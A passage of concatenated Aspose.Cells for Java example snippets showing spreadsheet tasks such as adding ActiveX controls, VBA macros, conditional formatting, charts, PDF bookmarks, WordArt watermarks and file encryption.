// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddActiveXControl.class);
// Create workbook object
Workbook wb = new Workbook();


// Access first worksheet
Worksheet sheet = wb.getWorksheets().get(0);


// Add Toggle Button ActiveX Control inside the Shape Collection
Shape s = sheet.getShapes().addActiveXControl(ControlType.TOGGLE_BUTTON, 4, 0, 4, 0, 100, 30);


// Access the ActiveX control object and set its linked cell property
ActiveXControl c = s.getActiveXControl();
c.setLinkedCell(""A1"");


// Save the worbook in xlsx format
wb.save(dataDir + ""output.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddConditionalIconsSet.class);
// Instantiate an instance of Workbook
Workbook workbook = new Workbook();
// Get the first worksheet (default worksheet) in the workbook
Worksheet worksheet = workbook.getWorksheets().get(0);
// Get the cells
Cells cells = worksheet.getCells();
// Set the columns widths (A, B and C)
worksheet.getCells().setColumnWidth(0, 24);
worksheet.getCells().setColumnWidth(1, 24);
worksheet.getCells().setColumnWidth(2, 24);


// Input date into the cells
cells.get(""A1"").setValue(""KPIs"");
cells.get(""A2"").setValue(""Total Turnover (Sales at List)"");
cells.get(""A3"").setValue(""Total Gross Margin %"");
cells.get(""A4"").setValue(""Total Net Margin %"");
cells.get(""B1"").setValue(""UA Contract Size Group 4"");
cells.get(""B2"").setValue(19551794);
cells.get(""B3"").setValue(11.8070745566204);
cells.get(""B4"").setValue(11.858589818569);
cells.get(""C1"").setValue(""UA Contract Size Group 3"");
cells.get(""C2"").setValue(8150131.66666667);
cells.get(""C3"").setValue(10.3168384396244);
cells.get(""C4"").setValue(11.3326931937091);


// Get the conditional icon's image data
byte[] imagedata = ConditionalFormattingIcon.getIconImageData(IconSetType.TRAFFIC_LIGHTS_31, 0);
// Create a stream based on the image data
ByteArrayInputStream stream = new ByteArrayInputStream(imagedata);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(1, 1, stream);


// Get the conditional icon's image data
byte[] imagedata1 = ConditionalFormattingIcon.getIconImageData(IconSetType.ARROWS_3, 2);
// Create a stream based on the image data
ByteArrayInputStream stream1 = new ByteArrayInputStream(imagedata1);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(1, 2, stream1);


// Get the conditional icon's image data
byte[] imagedata2 = ConditionalFormattingIcon.getIconImageData(IconSetType.SYMBOLS_3, 0);
// Create a stream based on the image data
ByteArrayInputStream stream2 = new ByteArrayInputStream(imagedata2);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(2, 1, stream2);


// Get the conditional icon's image data
byte[] imagedata3 = ConditionalFormattingIcon.getIconImageData(IconSetType.STARS_3, 0);
// Create a stream based on the image data
ByteArrayInputStream stream3 = new ByteArrayInputStream(imagedata3);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(2, 2, stream3);


// Get the conditional icon's image data
byte[] imagedata4 = ConditionalFormattingIcon.getIconImageData(IconSetType.BOXES_5, 1);
// Create a stream based on the image data
ByteArrayInputStream stream4 = new ByteArrayInputStream(imagedata4);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(3, 1, stream4);


// Get the conditional icon's image data
byte[] imagedata5 = ConditionalFormattingIcon.getIconImageData(IconSetType.FLAGS_3, 1);
// Create a stream based on the image data
ByteArrayInputStream stream5 = new ByteArrayInputStream(imagedata5);
// Add the picture to the cell based on the stream
worksheet.getPictures().add(3, 2, stream5);


// Save the Excel file
workbook.save(dataDir + ""outfile_cond_icons1.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddCustomLabelsToDataPoints.class);
Workbook workbook = new Workbook(FileFormatType.XLSX);
Worksheet sheet = workbook.getWorksheets().get(0);


// Put data
sheet.getCells().get(0, 0).putValue(1);
sheet.getCells().get(0, 1).putValue(2);
sheet.getCells().get(0, 2).putValue(3);


sheet.getCells().get(1, 0).putValue(4);
sheet.getCells().get(1, 1).putValue(5);
sheet.getCells().get(1, 2).putValue(6);


sheet.getCells().get(2, 0).putValue(7);
sheet.getCells().get(2, 1).putValue(8);
sheet.getCells().get(2, 2).putValue(9);


// Generate the chart
int chartIndex = sheet.getCharts().add(ChartType.SCATTER_CONNECTED_BY_LINES_WITH_DATA_MARKER, 5, 1, 24, 10);
Chart chart = sheet.getCharts().get(chartIndex);


chart.getTitle().setText(""Test"");
chart.getCategoryAxis().getTitle().setText(""X-Axis"");
chart.getValueAxis().getTitle().setText(""Y-Axis"");


chart.getNSeries().setCategoryData(""A1:C1"");


// Insert series
chart.getNSeries().add(""A2:C2"", false);


Series series = chart.getNSeries().get(0);


int pointCount = series.getPoints().getCount();
for (int i = 0; i < pointCount; i++) {
 ChartPoint pointIndex = series.getPoints().get(i);


 pointIndex.getDataLabels().setText(""Series 1"" + ""\n"" + ""Point "" + i);
}


// Insert series
chart.getNSeries().add(""A3:C3"", false);


series = chart.getNSeries().get(1);


pointCount = series.getPoints().getCount();
for (int i = 0; i < pointCount; i++) {
 ChartPoint pointIndex = series.getPoints().get(i);


 pointIndex.getDataLabels().setText(""Series 2"" + ""\n"" + ""Point "" + i);
}


workbook.save(dataDir + ""Test.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(AddImageHyperlinks.class);


// Instantiate a new workbook
Workbook workbook = new Workbook();


// Get the first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Insert a string value to a cell
worksheet.getCells().get(""C2"").setValue(""Image Hyperlink"");


// Set the 4th row height
worksheet.getCells().setRowHeight(3, 100);


// Set the C column width
worksheet.getCells().setColumnWidth(2, 21);


// Add a picture to the C4 cell
int index = worksheet.getPictures().add(3, 2, 4, 3, dataDir + ""aspose-logo.jpg"");


// Get the picture object
com.aspose.cells.Picture pic = worksheet.getPictures().get(index);


// Set the placement type
pic.setPlacement(PlacementType.FREE_FLOATING);


// Add an image hyperlink
pic.addHyperlink(""http://www.aspose.com/"");
com.aspose.cells.Hyperlink hlink = pic.getHyperlink();


// Specify the screen tip
hlink.setScreenTip(""Click to go to Aspose site"");


// Save the Excel file
workbook.save(dataDir + ""ImageHyperlink.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(AddingTwoAndThreeColorScale.class);
// Create workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Add some data in cells
worksheet.getCells().get(""A1"").putValue(""2-Color Scale"");
worksheet.getCells().get(""D1"").putValue(""3-Color Scale"");


for (int i = 2; i <= 15; i++) {
 worksheet.getCells().get(""A"" + i).putValue(i);
 worksheet.getCells().get(""D"" + i).putValue(i);
}


// Adding 2-Color Scale Conditional Formatting
CellArea ca = CellArea.createCellArea(""A2"", ""A15"");


int idx = worksheet.getConditionalFormattings().add();
FormatConditionCollection fcc = worksheet.getConditionalFormattings().get(idx);
fcc.addCondition(FormatConditionType.COLOR_SCALE);
fcc.addArea(ca);


FormatCondition fc = worksheet.getConditionalFormattings().get(idx).get(0);
fc.getColorScale().setIs3ColorScale(false);
fc.getColorScale().setMaxColor(Color.getLightBlue());
fc.getColorScale().setMinColor(Color.getLightGreen());


// Adding 3-Color Scale Conditional Formatting
ca = CellArea.createCellArea(""D2"", ""D15"");


idx = worksheet.getConditionalFormattings().add();
fcc = worksheet.getConditionalFormattings().get(idx);
fcc.addCondition(FormatConditionType.COLOR_SCALE);
fcc.addArea(ca);


fc = worksheet.getConditionalFormattings().get(idx).get(0);
fc.getColorScale().setIs3ColorScale(true);
fc.getColorScale().setMaxColor(Color.getLightBlue());
fc.getColorScale().setMidColor(Color.getYellow());
fc.getColorScale().setMinColor(Color.getLightGreen());


// Save the workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddLibraryReference.class);
Workbook workbook = new Workbook();


VbaProject vbaProj = workbook.getVbaProject();


vbaProj.getReferences().addRegisteredReference(""stdole"",
 ""*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\system32\\stdole2.tlb#OLE Automation"");
vbaProj.getReferences().addRegisteredReference(""Office"",
 ""*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.0#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL#Microsoft Office 14.0 Object Library"");


workbook.save(dataDir + ""output.xlsm"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddNamedRangeWithWorkbookScope.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Get Worksheets collection
WorksheetCollection worksheets = workbook.getWorksheets();


// Accessing the first worksheet in the Excel file
Worksheet sheet = worksheets.get(0);


// Get worksheet Cells collection
Cells cells = sheet.getCells();


// Creating a workbook scope named range
Range namedRange = cells.createRange(""A1"", ""C10"");
namedRange.setName(""workbookScope"");


// Saving the modified Excel file in default format
workbook.save(dataDir + ""output.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddNamedRangeWithWorkbookScope.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Get Worksheets collection
WorksheetCollection worksheets = workbook.getWorksheets();


// Accessing the first worksheet in the Excel file
Worksheet sheet = worksheets.get(0);


// Get worksheet Cells collection
Cells cells = sheet.getCells();


// Creating a workbook scope named range
Range namedRange = cells.createRange(""A1"", ""C10"");
namedRange.setName(""Sheet1!local"");


// Saving the modified Excel file in default format
workbook.save(dataDir + ""output.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddPDFBookmarks.class);
// Instantiate a new workbook.
Workbook workbook = new Workbook();


// Get the worksheets in the workbook.
WorksheetCollection worksheets = workbook.getWorksheets();


// Add a sheet to the workbook.
worksheets.add(""1"");


// Add 2nd sheet to the workbook.
worksheets.add(""2"");


// Add the third sheet.
worksheets.add(""3"");


// Get cells in different worksheets.
Cell cellInPage1 = worksheets.get(0).getCells().get(""A1"");
Cell cellInPage2 = worksheets.get(1).getCells().get(""A1"");
Cell cellInPage3 = worksheets.get(2).getCells().get(""A1"");


// Add a value to the A1 cell in the first sheet.
cellInPage1.setValue(""a"");


// Add a value to the A1 cell in the second sheet.
cellInPage2.setValue(""b"");


// Add a value to the A1 cell in the third sheet.
cellInPage3.setValue(""c"");


// Create the PdfBookmark entry object.
PdfBookmarkEntry pbeRoot = new PdfBookmarkEntry();


// Set its text.
pbeRoot.setText(""root"");


// Set its destination source page.
pbeRoot.setDestination(cellInPage1);


// Set the bookmark collapsed.
pbeRoot.setOpen(false);


// Add a new PdfBookmark entry object.
PdfBookmarkEntry subPbe1 = new PdfBookmarkEntry();


// Set its text.
subPbe1.setText(""1"");


// Set its destination source page.
subPbe1.setDestination(cellInPage2);


// Add another PdfBookmark entry object.
PdfBookmarkEntry subPbe2 = new PdfBookmarkEntry();


// Set its text.
subPbe2.setText(""2"");


// Set its destination source page.
subPbe2.setDestination(cellInPage3);


// Create an array list.
ArrayList subEntryList = new ArrayList();


// Add the entry objects to it.
subEntryList.add(subPbe1);
subEntryList.add(subPbe2);
pbeRoot.setSubEntry(subEntryList);


// Set the PDF bookmarks.
PdfSaveOptions options = new PdfSaveOptions();
options.setBookmark(pbeRoot);


// Save the PDF file.
workbook.save(dataDir, options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddPicturetoExcelComment.class) + ""articles/"";
// Instantiate a Workbook
Workbook workbook = new Workbook();


// Get a reference of comments collection with the first sheet
CommentCollection comments = workbook.getWorksheets().get(0).getComments();


// Add a comment to cell A1
int commentIndex = comments.add(0, 0);
Comment comment = comments.get(commentIndex);
comment.setNote(""First note."");
comment.getFont().setName(""Times New Roman"");


// Load/Read an image into stream
String logo_url = dataDir + ""school.jpg"";


// Creating the instance of the FileInputStream object to open the logo/picture in the stream
FileInputStream inFile = new FileInputStream(logo_url);


// Setting the logo/picture
byte[] picData = new byte[inFile.available()];
inFile.read(picData);


// Set image data to the shape associated with the comment
comment.getCommentShape().getFill().setImageData(picData);


// Save the workbook
workbook.save(dataDir + ""APToExcelComment_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AddVBAModuleAndCode.class);
// Create new workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Add VBA Module
int idx = workbook.getVbaProject().getModules().add(worksheet);


// Access the VBA Module, set its name and codes
VbaModule module = workbook.getVbaProject().getModules().get(idx);
module.setName(""TestModule"");


module.setCodes(""Sub ShowMessage()"" + ""\r\n"" + ""    MsgBox \""Welcome to Aspose!\"""" + ""\r\n"" + ""End Sub"");


// Save the workbook
workbook.save(dataDir + ""output.xlsm"", SaveFormat.XLSM);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtText.class) + ""articles/"";
// Create workbook object
Workbook wb = new Workbook();


// Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


// Add Word Art Text with Built-in Styles
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_1, ""Aspose File Format APIs"", 00, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_2, ""Aspose File Format APIs"", 10, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_3, ""Aspose File Format APIs"", 20, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_4, ""Aspose File Format APIs"", 30, 0, 0, 0, 100, 800);
ws.getShapes().addWordArt(PresetWordArtStyle.WORD_ART_STYLE_5, ""Aspose File Format APIs"", 40, 0, 0, 0, 100, 800);


// Save the workbook in xlsx format
wb.save(dataDir + ""AddWordArtText_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtWatermarkToChart.class) + ""articles/"";
// Instantiate a new workbook, Open the existing excel file.


Workbook workbook = new Workbook(dataDir + ""sample.xlsx"");


// Get the chart in the first worksheet.
Chart chart = workbook.getWorksheets().get(0).getCharts().get(0);


// Add a WordArt watermark (shape) to the chart's plot area.
Shape wordart = chart.getShapes().addTextEffectInChart(MsoPresetTextEffect.TEXT_EFFECT_1, ""CONFIDENTIAL"",
 ""Arial Black"", 66, false, false, 1200, 500, 2000, 3000);


// Get the shape's fill format.
FillFormat wordArtFormat = wordart.getFill();


// Set the transparency.
wordArtFormat.setTransparency(0.9);


// Get the line format.
LineFormat lineFormat = wordart.getLine();


// Set Line format to invisible.
lineFormat.setWeight(0.0);


// Save the excel file.
workbook.save(dataDir + ""AWArtWToC_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddWordArtWatermarkToWorksheet.class) + ""articles/"";
// Instantiate a new Workbook
Workbook workbook = new Workbook();


// Get the first default sheet
Worksheet sheet = workbook.getWorksheets().get(0);


// Add Watermark
Shape wordart = sheet.getShapes().addTextEffect(MsoPresetTextEffect.TEXT_EFFECT_1, ""CONFIDENTIAL"",
 ""Arial Black"", 50, false, true, 18, 8, 1, 1, 130, 800);


// Get the fill format of the word art
FillFormat wordArtFormat = wordart.getFill();


// Set the color
wordArtFormat.setOneColorGradient(Color.getRed(), 0.2, GradientStyleType.HORIZONTAL, 2);


// Set the transparency
wordArtFormat.setTransparency(0.9);


// Make the line invisible
LineFormat lineFormat = wordart.getLine();
lineFormat.setWeight(0.0);


// Save the file
workbook.save(dataDir + ""AWArtWToWorksheet_out.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AddXMLMapInsideWorkbook.class) + ""articles/"";
// Create workbook object
Workbook wb = new Workbook();


// Add xml map found inside the sample.xml inside the workbook
wb.getWorksheets().getXmlMaps().add(dataDir + ""sample.xml"");


// Save the workbook in xlsx format
wb.save(dataDir + ""AddXMLMapInsideWorkbook_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(ApplyingEncryption.class);


// Instantiate a Workbook object.
Workbook workbook = new Workbook(dataDir + ""Book1.xls"");


// Password protect the file.
workbook.getSettings().setPassword(""1234"");


// Specify Strong Encryption type (RC4,Microsoft Strong Cryptographic Provider).
workbook.setEncryptionOptions(EncryptionType.STRONG_CRYPTOGRAPHIC_PROVIDER, 128);


// Save the Excel file.
workbook.save(dataDir + ""encryptedBook1.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ApplyingSubscript.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Accessing the added worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


Cells cells = worksheet.getCells();


// Adding some value to the ""A1"" cell
Cell cell = cells.get(""A1"");


cell.setValue(""Hello"");


// Setting the font name to ""Times New Roman""
Style style = cell.getStyle();


Font font = style.getFont();
font.setSubscript(true);


cell.setStyle(style);


// Saving the modified Excel file in default format
workbook.save(dataDir + ""Subscript.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ApplyingSuperscript.class);
// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Accessing the added worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


Cells cells = worksheet.getCells();


// Adding some value to the ""A1"" cell
Cell cell = cells.get(""A1"");


cell.setValue(""Hello"");


// Setting the font name to ""Times New Roman""
Style style = cell.getStyle();


Font font = style.getFont();
font.setSuperscript(true);


cell.setStyle(style);


// Saving the modified Excel file in default format
workbook.save(dataDir + ""Superscript.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(ApplyShadingToAlternateRowsAndColumns.class);
/*
 * Create an instance of Workbook Optionally load an existing spreadsheet by passing its stream or path to Workbook
 * constructor
 */
Workbook book = new Workbook();


// Access the Worksheet on which desired rule has to be applied
Worksheet sheet = book.getWorksheets().get(0);


// Add FormatConditions to the instance of Worksheet
int index = sheet.getConditionalFormattings().add();


// Access the newly added FormatConditions via its index
FormatConditionCollection conditionCollection = sheet.getConditionalFormattings().get(index);


// Define a CellsArea on which conditional formatting will be applicable
CellArea area = CellArea.createCellArea(""A1"", ""I20"");


// Add area to the instance of FormatConditions
conditionCollection.addArea(area);


// Add a condition to the instance of FormatConditions. For this case, the condition type is expression, which is based on
// some formula
index = conditionCollection.addCondition(FormatConditionType.EXPRESSION);


// Access the newly added FormatCondition via its index
FormatCondition formatCondirion = conditionCollection.get(index);


// Set the formula for the FormatCondition. Formula uses the Excel's built-in functions as discussed earlier in this
// article
formatCondirion.setFormula1(""=MOD(ROW(),2)=0"");


// Set the background color and patter for the FormatCondition's Style
formatCondirion.getStyle().setBackgroundColor(Color.getBlue());
formatCondirion.getStyle().setPattern(BackgroundType.SOLID);


// Save the result on disk
book.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AssignMacroToFormControl.class);


Workbook workbook = new Workbook();
Worksheet sheet = workbook.getWorksheets().get(0);


int moduleIdx = workbook.getVbaProject().getModules().add(sheet);
VbaModule module = workbook.getVbaProject().getModules().get(moduleIdx);
module.setCodes(""Sub ShowMessage()"" + ""\r\n"" +
 ""    MsgBox \""Welcome to Aspose!\"""" + ""\r\n"" +
 ""End Sub"");


Button button = (Button) sheet.getShapes().addShape(MsoDrawingType.BUTTON, 2, 0, 2, 0, 28, 80);
button.setPlacement(PlacementType.FREE_FLOATING);
button.getFont().setName(""Tahoma"");
button.getFont().setBold(true);
button.getFont().setColor(Color.getBlue());
button.setText(""Aspose"");


button.setMacroName(sheet.getName() + "".ShowMessage"");


workbook.save(dataDir + ""Output.xlsm"");


System.out.println(""File saved"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AutoFitRowsforMergedCells.class);
// Instantiate a new Workbook
Workbook wb = new Workbook();


// Get the first (default) worksheet
Worksheet _worksheet = wb.getWorksheets().get(0);


// Create a range A1:B1
Range range = _worksheet.getCells().createRange(0, 0, 1, 2);


// Merge the cells
range.merge();


// Insert value to the merged cell A1
_worksheet.getCells().get(0, 0).setValue(
 ""A quick brown fox jumps over the lazy dog. A quick brown fox jumps over the lazy dog....end"");


// Create a style object
Style style = _worksheet.getCells().get(0, 0).getStyle();


// Set wrapping text on
style.setTextWrapped(true);


// Apply the style to the cell
_worksheet.getCells().get(0, 0).setStyle(style);


// Create an object for AutoFitterOptions
AutoFitterOptions options = new AutoFitterOptions();


// Set auto-fit for merged cells
options.setAutoFitMergedCells(true);


// Autofit rows in the sheet(including the merged cells)
_worksheet.autoFitRows(options);


// Save the Excel file
wb.save(dataDir + ""autofitmergedcells.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AutomaticallyrefreshOLEobject.class);


// Create workbook object from your sample excel file
Workbook wb = new Workbook(dataDir + ""sample.xlsx"");


// Access first worksheet
Worksheet sheet = wb.getWorksheets().get(0);


// Set auto load property of first ole object to true
sheet.getOleObjects().get(0).setAutoLoad(true);


// Save the worbook in xlsx format
wb.save(dataDir + ""output.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(CalculateIFNAfunction.class);
// Create new workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Add data for VLOOKUP
worksheet.getCells().get(""A1"").putValue(""Apple"");
worksheet.getCells().get(""A2"").putValue(""Orange"");
worksheet.getCells().get(""A3"").putValue(""Banana"");


// Access cell A5 and A6
Cell cellA5 = worksheet.getCells().get(""A5"");
Cell cellA6 = worksheet.getCells().get(""A6"");


// Assign IFNA formula to A5 and A6
cellA5.setFormula(""=IFNA(VLOOKUP(\""Pear\"",$A$1:$A$3,1,0),\""Not found\"")"");
cellA6.setFormula(""=IFNA(VLOOKUP(\""Orange\"",$A$1:$A$3,1,0),\""Not found\"")"");


// Caclulate the formula of workbook
workbook.calculateFormula();


// Print the values of A5 and A6
System.out.println(cellA5.getStringValue());
System.out.println(cellA6.getStringValue());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(CalculatePageSetupScalingFactor.class);
// Create workbook object
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Put some data in these cells
worksheet.getCells().get(""A4"").putValue(""Test"");
worksheet.getCells().get(""S4"").putValue(""Test"");


// Set paper size
worksheet.getPageSetup().setPaperSize(PaperSizeType.PAPER_A_4);


// Set fit to pages wide as 1
worksheet.getPageSetup().setFitToPagesWide(1);


// Calculate page scale via sheet render
SheetRender sr = new SheetRender(worksheet, new ImageOrPrintOptions());


// Write the page scale value
System.out.println(sr.getPageScale());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(CalculateWidthAndHeightOfCell.class);
// Create workbook object
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access cell B2 and add some value inside it
Cell cell = worksheet.getCells().get(""B2"");
cell.putValue(""Welcome to Aspose!"");


// Enlarge its font to size 16
Style style = cell.getStyle();
style.getFont().setSize(16);
cell.setStyle(style);


// Calculate the width and height of the cell value in unit of pixels
int widthOfValue = cell.getWidthOfValue();
int heightOfValue = cell.getHeightOfValue();


// Print both values
System.out.println(""Width of Cell Value: "" + widthOfValue);
System.out.println(""Height of Cell Value: "" + heightOfValue);


// Set the row height and column width to adjust/fit the cell value inside cell
worksheet.getCells().setColumnWidthPixel(1, widthOfValue);
worksheet.getCells().setRowHeightPixel(1, heightOfValue);


// Save the output excel file
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(CalculationOfArrayFormula.class);
// Create workbook from source excel file
Workbook workbook = new Workbook(dataDir + ""DataTable.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// When you will put 100 in B1, then all Data Table values formatted as Yellow will become 120
worksheet.getCells().get(""B1"").putValue(100);


// Calculate formula, now it also calculates Data Table array formula
workbook.calculateFormula();


// Save the workbook in pdf format
workbook.save(dataDir + ""output.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CalculationofExcelMINIFSandMAXIFSfunctions.class) + ""articles/"";


// Load your source workbook containing MINIFS and MAXIFS functions
Workbook wb = new Workbook(dataDir + ""sample_MINIFS_MAXIFS.xlsx"");


// Perform Aspose.Cells formula calculation
wb.calculateFormula();


// Save the calculations result in pdf format
PdfSaveOptions opts = new PdfSaveOptions();
opts.setOnePagePerSheet(true);
wb.save(dataDir + ""CalculationofExcel_out.pdf"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String dataDir = Utils.getDataDir(CellsIterator.class);
// Load a file in an instance of Workbook
Workbook book = new Workbook(dataDir + ""sample.xlsx"");


// Get the iterator from Cells collection
Iterator cellIterator = book.getWorksheets().get(0).getCells().iterator();
// Traverse cells in the collection
while (cellIterator.hasNext()) {
 Cell cell = (Cell) cellIterator.next();
	;
 System.out.println(cell.getName() + "" "" + cell.getValue());
}


// Get iterator from an object of Row
Iterator rowIterator = book.getWorksheets().get(0).getCells().getRows().get(0).iterator();
// Traverse cells in the given row
while (rowIterator.hasNext()) {
 Cell cell = (Cell) rowIterator.next();
 System.out.println(cell.getName() + "" "" + cell.getValue());
}


// Get iterator from an object of Range
Iterator rangeIterator = book.getWorksheets().get(0).getCells().createRange(""A1:B10"").iterator();
// Traverse cells in the range
while (rangeIterator.hasNext()) {
 Cell cell = (Cell) rangeIterator.next();
 System.out.println(cell.getName() + "" "" + cell.getValue());
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ChangeAbsolutePathofExternalLink.class) + ""articles/"";


// Load your source excel file containing the external link
Workbook wb = new Workbook(dataDir + ""sample.xlsx"");


// Access the first external link
ExternalLink externalLink = wb.getWorksheets().getExternalLinks().get(0);


// Print the data source of external link, it will print existing remote
// path
System.out.println(""External Link Data Source: "" + externalLink.getDataSource());


// Remove the remote path and print the new data source
// Assign the new data source to external link and print again, it will
// now print data source with local path
externalLink.setDataSource(""ExternalAccounts.xlsx"");
System.out.println(""External Link Data Source After Removing Remote Path: "" + externalLink.getDataSource());


// Change the absolute path of the workbook, it will also change the
// external link path
wb.setAbsolutePath(""C:\\Files\\Extra\\"");


// Now print the data source again
System.out.println(""External Link Data Source After Changing Workbook.AbsolutePath to Local Path: "" + externalLink.getDataSource());


// Change the absolute path of the workbook to some remote path, it will
// again affect the external link path
wb.setAbsolutePath(""http://www.aspose.com/WebFiles/ExcelFiles/"");


// Now print the data source again
System.out.println(""External Link Data Source After Changing Workbook.AbsolutePath to Remote Path: "" + externalLink.getDataSource());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ChangeAdjustmentValuesOfShape.class);


// Create workbook object from source excel file
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first three shapes of the worksheet
Shape shape1 = worksheet.getShapes().get(0);
Shape shape2 = worksheet.getShapes().get(1);
Shape shape3 = worksheet.getShapes().get(2);


// Change the adjustment values of the shapes
shape1.getGeometry().getShapeAdjustValues().get(0).setValue(0.5d);
shape2.getGeometry().getShapeAdjustValues().get(0).setValue(0.8d);
shape3.getGeometry().getShapeAdjustValues().get(0).setValue(0.5d);


// Save the workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ChangeCharacterSpacing.class) + ""articles/"";
// Load your excel file inside a workbook obect
Workbook wb = new Workbook(dataDir + ""character-spacing.xlsx"");


// Access your text box which is also a shape object from shapes collection
Shape shape = wb.getWorksheets().get(0).getShapes().get(0);


// Access the first font setting object via GetCharacters() method
ArrayList<FontSetting> lst = shape.getCharacters();
FontSetting fs = lst.get(0);


// Set the character spacing to point 4
fs.getTextOptions().setSpacing(4);


